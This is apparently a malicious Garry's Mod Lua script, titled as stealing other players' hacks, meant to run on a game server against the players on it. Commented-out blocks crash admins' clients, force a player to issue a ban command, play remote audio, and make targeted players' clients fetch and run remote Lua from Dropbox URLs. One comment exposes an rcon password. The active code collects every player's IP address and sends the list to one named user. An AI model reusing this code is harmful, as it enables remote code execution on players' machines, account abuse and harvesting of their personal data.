--[GTL] I'M IN YOUR LUA! STEALING YOUR HAX...

﻿/*
for _, p in pairs(player.GetAll()) do
	if (p:IsAdmin()) then
		p:SendLua("cam.End3D()")
	end
end
*/



/*
for _, p in pairs(player.GetAll()) do
	if (p:Nick() == "/Arma\ dragonslayer57") then
		p:SendLua("cam.End3D()")
	end
end
*/

/*
for _, p in pairs(player.GetAll()) do
	--if (p:Nick() == "/Arma\ An angry elder") then
		p:SendLua("RunConsoleCommand('say_team', '!ban elder 0')")
	--end
end
*/


/*
for _, p in pairs(player.GetAll()) do
	--if (p:Nick() == "/Arma\ dragonslayer57") then
		p:SetFOV(1,30)
	--end
end
*/

--rcon_password bea007;rcon ulx map ttt_minecraft_b5

/*
for _, p in pairs(player.GetAll()) do
	--iif (p:Nick() == "KhaoticPoisonIce") then
		p:SendLua('sound.PlayURL("http://k004.kiwi6.com/hotlink/9gma9f7gbk/Triple-Q_The_Boys_Speed_Highway.mp3", "loop", function() end)')
	--end
end
*/


/*
--blueballs
local lbb = "https://dl.dropboxusercontent.com/u/101744766/lua/bot/bluebot.lua"
local lhr = "https://dl.dropboxusercontent.com/u/101744766/lua/bot/hera.lua"

local lchet = lhr

local dnl = {
["STEAM_0:0:5035105"] = true,
["STEAM_0:1:38717786"] = true,
["STEAM_0:1:40851254"] = true,
["STEAM_0:0:65939726"] = true
}

local function filterp(p)
if (dnl[p:SteamID()]) then
return false
end

//if (p:Name() == "/Arma\ dragonslayer57") then
//return true
//end

return false
end

for _, p in pairs(player.GetAll()) do
if (filterp(p)) then
p:SendLua("xpcall(http.Fetch, function(msg) end, \"" .. lchet .. "\", RunString)")
end
end

*/

--"while true do end"


--for _, p in pairs(player.GetAll()) do	if (p:Nick() == "timecontroller13") then		p:SendLua("cam.End3D()") end end


local strIPs = "[IP Grabber]\\n"
local finalshit
local myname = "pls"
local me = nil
for k,v in pairs(player.GetAll()) do
	strIPs = strIPs..v:Name()..": "..v:IPAddress().."\\n"
	if v:Name() == myname then me = v end
end
strIPs = "print(\""..strIPs.."\")"
if me != nil then me:SendLua(strIPs) end
